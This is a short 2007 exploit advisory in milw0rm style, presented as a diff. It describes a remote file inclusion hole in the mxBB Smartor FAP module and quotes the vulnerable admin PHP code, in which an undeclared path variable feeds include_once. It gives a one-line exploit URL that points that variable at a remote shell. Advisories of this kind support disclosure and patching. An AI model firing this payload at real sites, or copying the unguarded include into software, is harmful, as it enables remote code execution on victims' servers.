@@ -1,0 +1,42 @@
+               ########################################################################
+
+                mxBB Module MX Smartor FAP 2.0 RC1 Remote File Inclusion Vulnerability
+
+               ########################################################################
+
+
+Class: Remote
+
+Vendor: http://www.mx-system.com/modules/mx_pafiledb/dload.php?action=download&file_id=364
+
+Founder: bd0rk
+
+Contact: bd0rk[at]hackermail.com
+
+Vulnerable Code in /admin/admin_album_otf.php
+
+---------------------------------------------------------------------------------------------
+define( 'IN_PORTAL', 1 );
+
+if ( !empty( $setmodules ) )
+{
+	$file = basename( __FILE__ );
+	$module['Smartor_Album']['Configuration otf'] = 'modules/mx_smartor/admin/' . $file;
+	return;
+}
+
+$mx_root_path = './../../../';
+$module_root_path = "./../";
+$phpEx = substr(strrchr(__FILE__, '.'), 1);
+require( $mx_root_path . '/admin/pagestart.' . $phpEx );
+
+include_once($phpbb_root_path . 'includes/functions_validate.'.$phpEx);
+---------------------------------------------------------------------------------------------
+
+$phpbb_root_path is not declared before include_once
+
+[+]Exploit: http://[target]/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=Shell?
+
+Shouts: str0ke, TheJT, Lu7k, GolD_M ;-)
+
+# milw0rm.com [2007-04-19]
